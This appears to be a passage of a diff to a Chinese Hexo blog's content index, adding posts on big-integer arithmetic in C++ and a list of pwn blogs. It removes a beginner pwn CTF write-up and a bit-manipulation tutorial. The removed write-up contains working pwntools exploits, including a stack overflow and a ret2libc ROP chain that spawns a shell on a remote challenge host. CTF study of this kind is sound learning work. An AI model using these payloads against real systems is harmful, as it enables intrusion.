class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tooplus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> temp=<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>());</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;temp;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		s[i]+=arr_a[i]+arr_b[i];<span class="comment">//这里必须使用+=因为要注意前一位的进位，防止丢失数据</span></span><br><span class="line">		s[i+<span class="number">1</span>]=s[i]/<span class="number">10</span>;</span><br><span class="line">		s[i]%=<span class="number">10</span>;<span class="comment">//标准操作，进位且本位取最后一位数字 </span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(s[temp]&gt;<span class="number">0</span>) add=<span class="number">1</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;a&gt;&gt;b;<span class="comment">//读入数据，为string型</span></span><br><span class="line">	<span class="built_in">change_arr</span>(a,b);</span><br><span class="line">	<span class="built_in">tooplus</span>();</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>())+add<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)<span class="comment">//判断输出的时候是否需要输出最终多出的一位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;s[i]; </span><br><span class="line">	&#125;</span><br><span class="line">	 <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里有一道例题，洛谷的p1601,可以用这个解法。</p>
+<h4 id="a-b高精度，a-b高精度"><a href="#a-b高精度，a-b高精度" class="headerlink" title="a-b高精度，a*b高精度"></a>a-b高精度，a*b高精度</h4><p>这两种方法基本一样，要注意的是减法有一些特殊情况，比如负数，输出长度的判断等等，这里我就摆一种简单的，乘法也是需要注意长度区别。</p>
+<p>实现代码：</p>
+<p>减法：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string a,b;</span><br><span class="line"><span class="type">bool</span> jg;</span><br><span class="line"><span class="type">int</span> arr_a[<span class="number">100005</span>],arr_b[<span class="number">10005</span>],ans[<span class="number">100005</span>],temp;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">re_input</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=a.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_a[i]=a[a.<span class="built_in">size</span>()-i]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">1</span>;j&lt;=b.<span class="built_in">size</span>();j++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_b[j]=b[b.<span class="built_in">size</span>()-j]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">to_divide</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=temp;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(arr_a[i]&lt;arr_b[i])</span><br><span class="line">		&#123;</span><br><span class="line">			arr_a[i+<span class="number">1</span>]--;</span><br><span class="line">			arr_a[i]+=<span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		ans[i]=arr_a[i]-arr_b[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(ans[temp]==<span class="number">0</span>) temp--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">to_printf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(jg==<span class="literal">true</span>) cout&lt;&lt;<span class="string">&quot;-&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =temp;i&gt;<span class="number">0</span>;i--)</span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;ans[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(temp&lt;<span class="number">1</span>) cout&lt;&lt;<span class="string">&quot;0&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">	<span class="keyword">if</span>(a&lt;b&amp;&amp;a.<span class="built_in">size</span>()==b.<span class="built_in">size</span>()||a.<span class="built_in">size</span>()&lt;b.<span class="built_in">size</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">swap</span>(a,b);</span><br><span class="line">		jg=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	temp=<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>());</span><br><span class="line">	<span class="built_in">re_input</span>();</span><br><span class="line">	<span class="built_in">to_divide</span>();</span><br><span class="line">	<span class="built_in">to_printf</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>乘法：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string a,b;</span><br><span class="line"><span class="type">int</span> arr01[<span class="number">100005</span>],arr02[<span class="number">100005</span>],sum[<span class="number">100005</span>],temp=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">re_change</span><span class="params">()</span><span class="comment">//倒序存储部分 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr01[i]=a[a.<span class="built_in">size</span>()-i<span class="number">-1</span>]<span class="number">-48</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr02[i]=b[b.<span class="built_in">size</span>()-i<span class="number">-1</span>]<span class="number">-48</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mutiply</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">0</span>;j&lt;a.<span class="built_in">size</span>();j++)</span><br><span class="line">		&#123;</span><br><span class="line">			sum[i+j]+=arr01[j]*arr02[i];<span class="comment">//注意下标从1开始，进位减去1 </span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(temp =<span class="number">0</span>;temp&lt;=a.<span class="built_in">size</span>()+b.<span class="built_in">size</span>();temp++)<span class="comment">//处理进位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		</span><br><span class="line">		sum[temp]+=sum[temp<span class="number">-1</span>]/<span class="number">10</span>;</span><br><span class="line">		sum[temp<span class="number">-1</span>]%=<span class="number">10</span>;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//temp=a.size()+b.size();</span></span><br><span class="line">	<span class="keyword">while</span>(sum[temp]==<span class="number">0</span>&amp;&amp;temp&gt;=<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		temp--;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"> &#125; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">	<span class="built_in">re_change</span>();</span><br><span class="line">	<span class="built_in">mutiply</span>();</span><br><span class="line">	<span class="keyword">for</span>(;temp&gt;=<span class="number">0</span>;temp--)</span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;sum[temp];</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以上内容皆为初学者的浅薄理解，如有错误麻烦立即告诉作者，别喷别喷别喷呜呜呜~</p>
+]]></content>
+      <categories>
+        <category>算法</category>
+      </categories>
+      <tags>
+        <tag>C++</tag>
+        <tag>算法</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>“代码规范”</title>
     <url>/2022/08/02/%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83/</url>
     <content><![CDATA[<p> 软件开发代码规范:</p>
@@ -270,208 +456,17 @@
       </tags>
   </entry>
   <entry>
-    <title>pwn:从一窍不通到入门的门前</title>
-    <url>/2022/07/06/pwn-%E4%BB%8E%E4%B8%80%E7%AA%8D%E4%B8%8D%E9%80%9A%E5%88%B0%E5%85%A5%E9%97%A8%E7%9A%84%E9%97%A8%E5%89%8D/</url>
-    <content><![CDATA[<p> 基础pwn例题，栈溢出，格式化字符串。</p>
+    <title>大牛的博客(学习用)</title>
+    <url>/2022/09/22/%E5%A4%A7%E7%89%9B%E7%9A%84%E5%8D%9A%E5%AE%A2-%E5%AD%A6%E4%B9%A0%E7%94%A8/</url>
+    <content><![CDATA[<p> 这里收录一些大佬的博客，可以跟着学习：</p>
 <span id="more"></span>
 
-<h3 id="栈溢出例题"><a href="#栈溢出例题" class="headerlink" title="栈溢出例题"></a>栈溢出例题</h3><h4 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h4><p>来源：攻防世界</p>
-<p>首先先checksec：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51X.png"></p>
-<p>再看伪代码：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51Y.png"></p>
-<p>再看偏移量：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51Z.png"></p>
-<p>这里基本就明白了：当dowrd_60106C=1853186401时，执行下面的sub函数，sub函数就直接得出flag了，因此只要再前一步的read函数那里创造栈溢出，再人为满足条件判断即可。</p>
-<p>exp:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./hello_pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;111.200.241.244&#x27;,52016)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p>来源：攻防世界</p>
-<p>checksec:</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a520.png"></p>
-<p>32位程序，开启堆栈不可执行，这是一道构造ROP的经典例题。</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a521.png"></p>
-<p>源码看出漏洞还是栈溢出，但是此时找不到现成的system函数和binsh字符串。</p>
-<p>因此要找到system函数，知识点(搬运自wiki)</p>
-<ul>
-<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
-<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</li>
-<li>查找Libc的网址：<a href="https://libc.blukat.me/">https://libc.blukat.me/</a>和<a href="https://libc.rip/">https://libc.rip/</a></li>
-</ul>
-<p>简单来说：实际的(真实的)地址是需要计算出来的，具体计算方式是：<strong>实际地址=libc偏移量+libc基地址</strong>在已知libc的情况下，我们需要做的就是找到<strong>libc的基址</strong>，而想要找到基址，我们需要知道一个函数的实际地址，本题中关键函数内存在write,read函数，因此想法是使用write函数泄露出write函数的真实地址，而plt表，got表，实际加载地址可以参考下图(搬运自csdn(滑稽))：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a522.png"></p>
-<p>这样就可以得到基本的思路了: 先构造栈溢出使程序跳到write函数的plt表地址上，此时再次调用main函数或者vulnerable函数再次执行，此时就可以利用write函数打印出write的got表地址，此时需要我们人为的输入write函数的参数。这样就可以得到write函数的真实地址了。栈上的流程大概是这样的（仍然是搬运的(滑天下之大稽）：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a523.png"></p>
-<p>这样输出之后我们就得到了write函数的真实地址了，再通过libc来求得system和binsh的真实地址，最后第二次调动程序，再次利用漏洞，就可以得到shell。</p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./level3&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">59245</span>)</span><br><span class="line"></span><br><span class="line">padding=<span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_got_addr=u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(write_got_addr)</span><br><span class="line"></span><br><span class="line">libc_write=libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_base=write_got_addr-libc_write</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the system address is:&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_bin=<span class="built_in">next</span>(libc.search(<span class="string">b&quot;bin/sh&quot;</span>))//找到binsh偏移的方法</span><br><span class="line">bin_addr=libc_base+libc_bin</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the binsh address is:&quot;</span>,<span class="built_in">hex</span>(bin_addr))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*padding+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>基本原理以及利用方法在wiki上有解释。</p>
-<p>&lt;<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">原理介绍 - CTF Wiki (ctf-wiki.org)</a>&gt;</p>
-<h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p>啥都没有，因为懒得搞，搞堆去了</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51S.jpg"></p>
+<h2 id="Pwn手师傅们的博客"><a href="#Pwn手师傅们的博客" class="headerlink" title="Pwn手师傅们的博客"></a>Pwn手师傅们的博客</h2><p><a href="https://godjj.top/">https://godjj.top/</a></p>
+<p><a href="https://csomepro.github.io/">https://csomepro.github.io/</a></p>
+<p><a href="https://www.cnblogs.com/ZIKH26">https://www.cnblogs.com/ZIKH26</a></p>
+<p><a href="https://github.com/tangzichengcc/The_Growth_Path_Of_A_CTFer_And_Pwner">https://github.com/tangzichengcc/The_Growth_Path_Of_A_CTFer_And_Pwner</a></p>
+<p><a href="http://blog.eonew.cn/">http://blog.eonew.cn/</a></p>
 ]]></content>
-      <categories>
-        <category>CTF!</category>
-      </categories>
-      <tags>
-        <tag>基础</tag>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>位运算</title>
-    <url>/2022/09/21/%E4%BD%8D%E8%BF%90%E7%AE%97/</url>
-    <content><![CDATA[<p> 位运算基础概念以及题目：</p>
-<span id="more"></span>
-
-<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><h4 id="位与"><a href="#位与" class="headerlink" title="位与"></a>位与</h4><p>符号：&amp;</p>
-<p>12&amp;10—&gt;1100&amp;1010（转换为二进制）</p>
-<p>从低到高按位运算，当两个数字都为1，结果才为1，否则为0，因此结果为1000，也就是8</p>
-<h4 id="位或"><a href="#位或" class="headerlink" title="位或"></a>位或</h4><p>符号：|</p>
-<p>12|10—–&gt;1100|1010</p>
-<p>从低到高按位运算，当两个数字都为0，结果才为0，否则为1，因此结果为1110，也就是14</p>
-<p>小概念：相同的数异或为0，任何数与0异或为它本身，满足交换律和结合律</p>
-<h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><p>符号：^</p>
-<p>12^10—–&gt;1100^1010</p>
-<p>从低到高按位运算，当两个数字都不同，结果才为1，否则为0，因此结果为0110，也就是6。</p>
-<p>从结果来看，异或可以看作不进位的加法</p>
-<h4 id="左移"><a href="#左移" class="headerlink" title="左移"></a>左移</h4><p>符号：&lt;&lt;</p>
-<p>12&lt;&lt;3—–&gt;1100&lt;&lt;3</p>
-<p>想左移三位，末尾补零，因此结果为1100000.另外，左移一位可以看作该数字乘二。</p>
-<h4 id="右移"><a href="#右移" class="headerlink" title="右移"></a>右移</h4><p>符号: &gt;&gt;</p>
-<p>12&gt;&gt;3—–&gt;1100&gt;&gt;3=1</p>
-<p>右移三位，右移一位可看作除二向下取整</p>
-<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="2的幂"><a href="#2的幂" class="headerlink" title="2的幂"></a>2的幂</h4><p><a href="https://leetcode.cn/problems/power-of-two/">https://leetcode.cn/problems/power-of-two/</a></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">isPowerOfTwo</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n&gt;<span class="number">0</span>&amp;&amp;(n&amp;(n<span class="number">-1</span>))==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>解析：当一个数为2的幂时，他的表达方式一定为100000….，这个数n表达方式固定，n-1则确定为0111111….。因此对n和n-1取位与，结果一定为1，因此可判断。</p>
-<h4 id="4的幂"><a href="#4的幂" class="headerlink" title="4的幂"></a>4的幂</h4><p><a href="https://leetcode.cn/problems/power-of-four/">https://leetcode.cn/problems/power-of-four/</a></p>
-<p>解析：分析可知：$2^{2x}mod 3=1$ 且 $2^{2x+1}mod 3=2$ 因此可以得出结论$4^xmod3=1$ 。因此，当一个数n是2的幂，同时模3为1，则他一定是4的幂</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool isPowerOfFour(int n)&#123;</span><br><span class="line">    return (n&gt;0)&amp;&amp;(n&amp;(n-1))==0&amp;&amp;n % 3==1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="位1的个数"><a href="#位1的个数" class="headerlink" title="位1的个数"></a>位1的个数</h4><p><a href="https://leetcode.cn/problems/number-of-1-bits/">https://leetcode.cn/problems/number-of-1-bits/</a></p>
-<p>解析：任何一个数字的二进制表示必然可以表示为0，1的组合，当一个数字的二进制形式为….1000时我们把它减去1，则变为形式…..0111,当我们把这两个数进行位与运算，得到的结果为…..0000。我们发现最末尾的1被我们消除了，当我们重复这个过程，在这个过程中记录进行的次数，当最后n变为0时，计数结果就为1的个数。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hammingWeight</span><span class="params">(<span class="type">uint32_t</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(n!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        count++;</span><br><span class="line">        <span class="type">int</span> ans=n&amp;(n<span class="number">-1</span>);</span><br><span class="line">        n=ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="交换数字"><a href="#交换数字" class="headerlink" title="交换数字"></a>交换数字</h4><p><a href="https://leetcode.cn/problems/swap-numbers-lcci/">https://leetcode.cn/problems/swap-numbers-lcci/</a></p>
-<p>解法：</p>
-<ul>
-<li>a=a^b</li>
-<li>b=a^b=a^b^b=a^0=a</li>
-<li>a=a^b=a^a^b=b</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span>* <span class="title function_">swapNumbers</span><span class="params">(<span class="type">int</span>* a, <span class="type">int</span> aSize, <span class="type">int</span>* returnSize)</span>&#123;</span><br><span class="line">    a[<span class="number">0</span>]=a[<span class="number">1</span>]^a[<span class="number">0</span>];</span><br><span class="line">    a[<span class="number">1</span>]=a[<span class="number">1</span>]^a[<span class="number">0</span>];</span><br><span class="line">    a[<span class="number">0</span>]=a[<span class="number">1</span>]^a[<span class="number">0</span>];</span><br><span class="line">    *returnSize=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="只出现一次的数字"><a href="#只出现一次的数字" class="headerlink" title="只出现一次的数字"></a>只出现一次的数字</h4><p><a href="https://leetcode.cn/problems/single-number/">https://leetcode.cn/problems/single-number/</a></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">singleNumber</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span>&#123;</span><br><span class="line">    <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;numsSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum=sum^nums[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>解法：很巧妙的解法，根据异或的性质，我们发现当我们从头开始循环异或，出现两次的数必然可以结合异或结果为0，最后只剩下异或结果为本身的数，这个数就是出现一次的数。(草，真的牛逼)</p>
-<h4 id="汉明距离"><a href="#汉明距离" class="headerlink" title="汉明距离"></a>汉明距离</h4><p><a href="https://leetcode.cn/problems/hamming-distance/">https://leetcode.cn/problems/hamming-distance/</a></p>
-<p>解析：把两个数字异或，我们发现结果为1的位上就是两个数字对应二进制位不同的位置，因此我们把异或后的结果进行1消去，同时统计1的个数，答案就是汉明距离。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hammingDistance</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>&#123;</span><br><span class="line">    <span class="type">int</span> n=x^y;</span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(n)</span><br><span class="line">    &#123;</span><br><span class="line">        n=n&amp;(n<span class="number">-1</span>);</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="交替位二进制数"><a href="#交替位二进制数" class="headerlink" title="交替位二进制数"></a>交替位二进制数</h4><p><a href="https://leetcode.cn/problems/binary-number-with-alternating-bits/">https://leetcode.cn/problems/binary-number-with-alternating-bits/</a></p>
-<p>解析：题目意思可以视为判断数字n的二进制表达形式是否为01连续出现，我们判断当00和11出现时对应的十进制数字为0和3，因此我们将数字n与3位与，如果符合题意，得到的结果只能是10或者01，即为1，2，如果出现0，3，则说明n中出现了00，11的组合，则返回false。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">hasAlternatingBits</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((n&amp;<span class="number">3</span>)==<span class="number">0</span>||(n&amp;<span class="number">3</span>)==<span class="number">3</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        n=n&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="找出所有子集的异或总和再求和"><a href="#找出所有子集的异或总和再求和" class="headerlink" title="找出所有子集的异或总和再求和"></a>找出所有子集的异或总和再求和</h4><p><a href="https://leetcode.cn/problems/sum-of-all-subset-xor-totals/">https://leetcode.cn/problems/sum-of-all-subset-xor-totals/</a></p>
-<p>解析：这个题我搞了半天（md我怎么这么菜），首先是我们要明白一个数组的子集个数是2的元素个数的次方，因此第一个循环是为了找到所有的子集，当我们找到所有子集之后，我们要对每一个子集进行分析，因为集合中的元素在子集中只会有两种状态，0（未出现）和1（出现），因此，<strong>每个子集都可以表示为一个二进制数字</strong>，比如数组[2,3,4]的子集之一[2,3]，用相对应的二进制数字来表示就是110。这样表示完每一个子集后，我们对每一个二进制数进行分析，当我们在二进制数中寻找到1时，说明对应的数组nums[i]在子集中存在，就可以进行异或操作了，而寻找二进制数中的1可以用一个表达式来解决:**i&amp;(1&lt;&lt;j)**。意思是寻找二进制数i在第j位是否为1。当第二次循环遍历二进制数位数之后，我们就可以确定存在的元素，就可以进行必要的异或和相加的操作了。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">subsetXORSum</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,ans;</span><br><span class="line">    <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;(<span class="number">1</span>&lt;&lt;numsSize);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;numsSize;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i&amp;(<span class="number">1</span>&lt;&lt;j)) ans^=nums[j];</span><br><span class="line">        &#125;</span><br><span class="line">        sum+=ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
